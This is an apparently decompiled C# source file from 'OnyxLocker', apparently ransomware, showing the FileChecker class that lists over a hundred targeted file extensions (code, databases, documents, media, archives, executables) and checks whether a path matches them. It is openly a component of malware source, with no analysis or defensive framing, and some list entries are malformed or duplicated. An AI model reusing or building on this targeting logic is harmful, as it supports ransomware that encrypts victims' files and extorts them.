using System;
using System.IO;
using System.Linq;

namespace OnyxLocker
{
	// Token: 0x02000003 RID: 3
	internal class FileChecker : IFileChecker
	{
		// Token: 0x17000003 RID: 3
		// (get) Token: 0x06000009 RID: 9 RVA: 0x0000218A File Offset: 0x0000038A
		public string[] TargetFiles { get; } = new string[]
		{
			".js",
			".sln",
			".suo",
			".cs",
			".c",
			".cpp",
			".pas",
			".h",
			".asm",
			".sqlite3",
			".sqlitedb",
			".sql",
			".accdb",
			".mdb",
			".db",
			".cmd",
			".bat",
			".lnk",
			".url",
			".mat",
			".kys",
			".pif",
			".scf",
			".shs",
			".shb",
			".xnx",
			".ps1",
			".vbs",
			".vb",
			".pl",
			".jsp",
			".php",
			".asp",
			".rb",
			".java",
			".jar",
			".class",
			".sh",
			".mp3",
			".wav",
			".swf",
			".fla",
			".wmv",
			".mpg",
			".vob",
			".mpeg",
			".asf",
			".avi",
			".mov",
			".mp4",
			".3gp",
			".mkv",
			".3g2",
			".flv",
			".raw",
			".gif",
			".png",
			".bmp",
			".jpg",
			".jpeg",
			".vcd",
			".iso",
			".backup",
			".zip",
			".rar",
			".7z",
			".gz",
			".tgz",
			".ta",
			".pdf",
			".pptx",
			".ppt",
			".xltm",
			".xltx",
			".xlc",
			".xlm",
			".xlt",
			".xlw",
			".xlsb",
			".xlsm",
			".xlsx",
			".xls",
			".docx",
			".doc",
			".htm,",
			".html",
			".php5",
			".php",
			".phtml",
			".fla",
			".cmd",
			".ink",
			".exe",
			". txt",
			".gif",
			".csv",
			".raw",
			".lua",
			".dat",
			".vbs",
			".vb6",
			".apk",
			".config",
			".c",
			".resx",
			".vbproj",
			".myapp",
			".cache",
			".pdb",
			".manifest",
			".png",
			".bmp",
			".eps",
			".hdr",
			".exr",
			".ico",
			".svg",
			".tga",
			".tiff",
			".wbmp",
			".webp"
		};

		// Token: 0x0600000A RID: 10 RVA: 0x00002194 File Offset: 0x00000394
		public bool IsTargetFile(string filePath)
		{
			string value = Path.GetExtension(filePath).ToLower();
			return this.TargetFiles.Contains(value);
		}
	}
}
